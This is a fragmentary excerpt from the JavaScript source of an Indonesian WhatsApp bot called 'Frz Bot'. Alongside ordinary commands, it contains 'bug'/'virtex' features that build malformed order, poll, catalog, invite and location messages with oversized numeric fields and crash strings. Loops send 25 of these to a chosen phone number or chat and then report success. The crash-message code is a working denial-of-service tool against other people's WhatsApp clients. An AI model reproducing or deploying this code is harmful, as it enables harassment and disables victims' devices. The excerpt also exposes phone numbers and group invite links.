...
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - FrzXD '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6285648089321@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
message: {
orderMessage: {
itemCount : 772551099253319000,
status: 55252529901097513221855,
surface : 715551929614172995,
message: virus,
orderTitle: virus,
thumbnail: ppnyauser,
...
"fileLength": "555000000000",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Frz Bot WhatsApp${ngazap(prefix)}`,
...
item3.URL:https://youtube.com/channel/UCW2DZKUQ1J7JrvX7nrpTgZQ\n
...
"message": {
"pollCreationMessage": {
"name": `Frz Bot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Frz Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Frz Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "6285648089321@s.whatsapp.net",
...
const botzkayla = "6285648089321@s.whatsapp.net"
...
Gwehj KullBot, Bot Kecehh Terkemren Ter asesole, Mohon Untuk Jangan Spam !!!
...
Title : ${atdl.title}`, `Auto Downloader By FrzXD`, ftext)
}
}
...
mentions: [sender],
footer: fake,
buttonText: 'List Button By FrzXD',
sections: seactions,
listType: 1}
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/JMY6FGfvPgY74buVkVe1oD',
"sourceUrl": 'https://chat.whatsapp.com/JMY6FGfvPgY74buVkVe1oD'
}
}
})
break
...
owned = '6285648089321@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285648089321`)
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI FAIRUZ BOT"
	}
],
"selectableOptionsCount": 5
	}
...
contextInfo:{
"externalAdReply": {
"title": `Frz Bot ${virus}${virtex(prefix)}`,
"body": `Frz Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Frz Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/FrzXD`,
...
Message: { 
extendedTextMessage: { 
text: `Frz Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"caption": `Frz Bot ${virus}${virtex(prefix)}`,
...
Message: { 
extendedTextMessage: { 
text: `Frzz Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Frz Bot ${virus}${virtex(prefix)}`, `Frz Bot ${virus}${virtex(prefix)}`, `Frz Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `Frz Bot WhatsApp ${virus} ${virtex(prefix)}`,
...
"url": `https://wa.me/6285648089321`
},
"businessOwnerJid": "6285648089321@s.whatsapp.net",
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Frz Bot ${virus}${virtex(prefix)}`, `Frz Bot ${virus}${virtex(prefix)}`, `Frz Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6285648089321@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Frz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Frz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Frz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
kayla.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Frz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Frz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
...
"address": `Created By FrzXD ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
let e = String(err)
sendKaylaMessage("6285648089321@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
